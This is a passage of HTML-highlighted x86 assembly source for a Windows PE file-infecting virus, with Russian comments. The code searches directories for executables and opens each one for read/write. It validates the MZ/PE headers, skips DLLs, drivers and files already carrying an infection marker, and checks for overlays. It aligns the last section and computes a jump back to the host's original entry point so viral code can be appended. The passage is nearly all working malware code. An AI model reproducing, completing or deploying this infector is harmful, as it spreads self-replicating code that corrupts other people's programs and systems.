                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_ini_string</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">find_next</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_fuck_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">start_timer</span><span class="sc0">
</span><span class="sc5">find_next</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; Вызов FindNextFileA:</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;FIND структура&gt;</span><span class="sc0">
</span><span class="sc1">;               push &lt;хендл поиска&gt;</span><span class="sc0">
</span><span class="sc1">;               call FindNextFileA</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">findstruc</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_handler</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourFindNextFileA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">compare_or_not</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_fuck_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">set_fuck_flag</span><span class="sc0">
</span><span class="sc1">; Вызов FindClose:</span><span class="sc0">
</span><span class="sc1">;               push &lt;хендл поиска&gt;</span><span class="sc0">
</span><span class="sc1">;               call FindClose</span><span class="sc0">
</span><span class="sc5">go_out</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_handler</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourFindClose</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dotdot</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourSetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">start_timer</span><span class="sc0">             </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourGetTickCount</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">do_file</span><span class="sc0">                 </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">; Обрабатывает файл</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ff_fullname</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202000h</span><span class="sc0"> </span><span class="sc1">; Приводит к нижнему регистру</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DOEXE</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'iwg.'</span><span class="sc0"> </span><span class="sc1">; файл - gwi?</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'exe.'</span><span class="sc0"> </span><span class="sc1">; файл - ехе?</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">it_not_exe</span><span class="sc0">
</span><span class="sc1">; Установить нормальные атрибуты</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ff_fullname</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourSetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">; Открыть файл для чтения/записи</span><span class="sc0">
</span><span class="sc1">; Вызов CreateFileA:</span><span class="sc0">
</span><span class="sc1">;               push 0</span><span class="sc0">
</span><span class="sc1">;               push &lt;атрибуты файла&gt; ; 80h - нормальные</span><span class="sc0">
</span><span class="sc1">;               push &lt;реакция на отсуствие файла&gt;</span><span class="sc0">
</span><span class="sc1">;                                    ; 2=CREATE_ALWAYS, 3=OPEN_EXISTING</span><span class="sc0">
</span><span class="sc1">;               push 0</span><span class="sc0">
</span><span class="sc1">;               push &lt;типа какой доступ&gt; ; 1 = FILE_SHARE_READ</span><span class="sc0">
</span><span class="sc1">;                                        ; 2 = FILE_SHARE_WRITE</span><span class="sc0">
</span><span class="sc1">;               push &lt;режим доступа&gt; ; 80000000h = GENERIC_READ</span><span class="sc0">
</span><span class="sc1">;                                    ; 40000000h = GENERIC_WRITE</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;имя файла&gt;</span><span class="sc0">
</span><span class="sc1">;               call CreateFileA</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; Нормальный атрибут</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; открывать только имеющиеся файлы</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; чтение/запись</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc4">+</span><span class="sc2">40000000h</span><span class="sc0"> </span><span class="sc1">; чтение /запись</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ff_fullname</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourCreateFileA</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Есть ошибки?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">it_not_exe</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Сохраним handle файла</span><span class="sc0">
</span><span class="sc1">; Файл открыт и все ништяк.</span><span class="sc0">

</span><span class="sc1">; Считаем 40h - MZ заголовок</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_header</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">
</span><span class="sc1">; Проверка на MZ</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_signat</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc1">; Установим указатель на PE заголовок</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_pe_pointer</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_pointer</span><span class="sc0">
</span><span class="sc1">; Считаем PE заголовок</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_header</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">
</span><span class="sc1">; Проверим на PE</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_header</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc1">; Проверим на DLL</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_flags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc1">; Проверим на Device Driver (не трожь говно, вонять не будет)</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_subsys</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc1">; Проверим на зараженность</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_user_minor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'WG'</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc1">; Получим длину РЕ заголовка</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_nt_hdr_size</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc1">; Получим смещение Таблицы Объектов в файле</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_pe_pointer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">; Установим указатель на начало заголовка первой секции</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_pointer</span><span class="sc0">
</span><span class="sc1">; Считаем заголовок в буффер sec_header</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_header</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">
</span><span class="sc1">; Получим адрес начала первой секции</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_rva</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">; Прибавим Virtual Size</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_virtual_size</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">; Сравним адрес конца первой секции с точкой входа (оба адреса - RVA)</span><span class="sc0">
</span><span class="sc1">; Если точка входа больше адреса конца первой секции (точка входа не в</span><span class="sc0">
</span><span class="sc1">; первой секции) файл не трогаем, мало ли...</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_entry_point_rva</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc1">; Получим адрес заголовка последней секции</span><span class="sc0">
</span><span class="sc1">; Число секций указанно в PE+06h. Секции нумеруются начиная с 1. Заголовок</span><span class="sc0">
</span><span class="sc1">; каждой секции занимает 28h.</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Сохраним в стеке смещение на начало</span><span class="sc0">
                                 </span><span class="sc1">; Таблицы Объектов в файле</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_num_of_objects</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Последняя секция</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; ESI = смещение в файле на заголовок</span><span class="sc0">
                                     </span><span class="sc1">;последней секции</span><span class="sc0">
</span><span class="sc1">; Установим указатель на начало оной секции</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_sec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_pointer</span><span class="sc0">
</span><span class="sc1">; Считаем заголовок в буффер sec_header</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_header</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">
</span><span class="sc1">; Выравняем физичексую и виртуальную длины последней секции по</span><span class="sc0">
</span><span class="sc1">; соответствующим значениям FileAlign (PE+3ch) и ObjectAlign (PE+38h)</span><span class="sc0">
</span><span class="sc1">; Длины оные храняться в SectionHeader+10h (PhysicalSize) и SectionHeader+</span><span class="sc0">
</span><span class="sc1">; 08h (VIrtualSize) соответственно. Характеризуют они размер секции на диске</span><span class="sc0">
</span><span class="sc1">; (физический размер) и в памяти (виртуальный)</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_file_align</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_physical_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_physical_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">; Виртуальный:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_object_align</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_virtual_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_virtual_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">; Проверка на оверлей:</span><span class="sc0">
</span><span class="sc1">; Если</span><span class="sc0">
</span><span class="sc1">; (Расчетный физ. размер файла - Реальный размер оного файла) &gt; File Align</span><span class="sc0">
</span><span class="sc1">; =&gt; Оверлей.</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_physical_size</span><span class="sc4">]</span><span class="sc0">
                                           </span><span class="sc1">; Физический размер посл. секции</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_phys_offset</span><span class="sc4">]</span><span class="sc0">
                                           </span><span class="sc1">; Смещение начала оной секции</span><span class="sc0">
                                           </span><span class="sc1">; относительно начала ЕХЕ (в</span><span class="sc0">
                                           </span><span class="sc1">; сумме дают размер файла)</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">our_place</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Пригодится</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ff_file_size_low</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Вычтем из</span><span class="sc0">
                                           </span><span class="sc1">; расчетного размера файла его</span><span class="sc0">
                                           </span><span class="sc1">; реальный размер</span><span class="sc0">
</span><span class="sc5">positive</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Получим результат по модулю</span><span class="sc0">
                        </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">positive</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_file_align</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; И сравним его с</span><span class="sc0">
                                           </span><span class="sc1">; выравниванием в файле</span><span class="sc0">
                        </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Если остаток от вычитания</span><span class="sc0">
                                           </span><span class="sc1">; больше File Align - оверлей.</span><span class="sc0">

</span><span class="sc1">; Также нужно следить, шоб обе длинны не были нулевыми и физическая не была</span><span class="sc0">
</span><span class="sc1">; больше виртуальной</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_physical_size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Физическая</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_virtual_size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Виртуальная</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc1">; Сохраним старую точку входа</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_rva</span><span class="sc4">]</span><span class="sc0">
                                           </span><span class="sc1">; RVA последней секции в памяти</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_physical_size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Физический размер</span><span class="sc0">
                                                     </span><span class="sc1">; последней секции</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">original_ip</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virstart</span><span class="sc0">
                                           </span><span class="sc1">; 4 потому как JMP</span><span class="sc0">
                        </span><span class="sc1">; скачет относительно следующей после себя (и</span><span class="sc0">
                        </span><span class="sc1">; аргумента своего) команды, аргумент у нас - DWORD</span><span class="sc0">
                        </span><span class="sc1">; - 4 байта. После всех этих операций в ESI у нас</span><span class="sc0">
                        </span><span class="sc1">; RVA следущей после JMP dd X команды.</span><span class="sc0">
